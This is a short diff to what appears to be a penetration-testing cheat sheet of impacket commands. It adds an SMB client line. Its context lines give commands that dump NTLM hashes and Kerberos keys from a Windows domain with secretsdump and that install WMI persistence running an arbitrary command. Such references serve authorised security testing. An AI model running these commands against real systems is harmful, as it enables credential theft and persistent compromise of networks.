@@ -339,6 +339,8 @@ impacket-netview -target 'IP' -delay 'SECOND' -ts 'DOMAIN/USERNAME:PASSWORD'
 # dumping NTLM hashs and Kerberos Keys
 impacket-secretsdump -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-secretsdump -ts -just-dc-user 'USERNAME' -just-dc-ntlm 'DOMAIN/USERNAME:PASSWORD@IP'
+# smb
+impacket-smbclient 'DOMAIN/USERNAME:PASSWORD@IP'
 # wmi
 impacket-wmipersist 'DOMAIN/USERNAME:PASSWORD@IP' install -name 'NAME' -command "COMMAND"
 impacket-wmiquery 'DOMAIN/USERNAME:PASSWORD@IP'
